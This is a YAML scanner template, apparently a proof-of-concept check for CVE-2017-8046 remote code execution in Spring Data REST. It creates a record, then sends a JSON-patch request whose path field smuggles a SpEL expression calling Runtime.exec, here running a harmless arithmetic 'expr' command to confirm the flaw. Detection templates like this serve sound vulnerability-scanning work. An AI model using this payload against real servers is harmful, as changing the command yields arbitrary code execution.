name: poc-yaml-spring-data-rest-cve-2017-8046-rce
manual: true
transport: http
set:
    firstName: randomLowercase(4)
    lastName: randomLowercase(4)
    rand1: randomInt(200000000, 210000000)
    rand2: randomInt(200000000, 210000000)
    payload: urlencode("java.lang.Runtime.getRuntime().exec(\"expr " + string(rand1) + " + " + string(rand2) + "\").getInputStream()")
rules:
    r1:
        request:
            cache: true
            method: POST
            path: /persons
            headers:
                Accept: application/hal+json
                Content-Type: application/json-patch+json
            body: |
                {"firstName":"{{firstName}}","lastName":"{{lastName}}"}
        expression: |
            response.status == 201 && response.body.bcontains(bytes(firstName)) && response.body.bcontains(bytes(lastName))
        output:
            search: '"persons\\/(?P<personNum>\\d+)".bsubmatch(response.body)'
            personNum: search["personNum"]
    r2:
        request:
            cache: true
            method: PATCH
            path: /persons/{{personNum}}
            headers:
                Content-Type: application/json-patch+json
            body: |
                [{ "op": "replace", "path": "T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName('JavaScript').eval(T(java.net.URLDecoder).decode('{{payload}}')),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())/{{lastName}}", "value": "changed" }]
        expression: |
            response.status == 200 && response.body.bcontains(bytes(string(rand1 + rand2)))
expression: r1() && r2()
detail:
    author: corp0ra1(https://github.com/corp0ra1)
    links:
        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8046
        - https://github.com/bkhablenko/CVE-2017-8046
    vulnerability:
        id: CT-74511
        level: critical
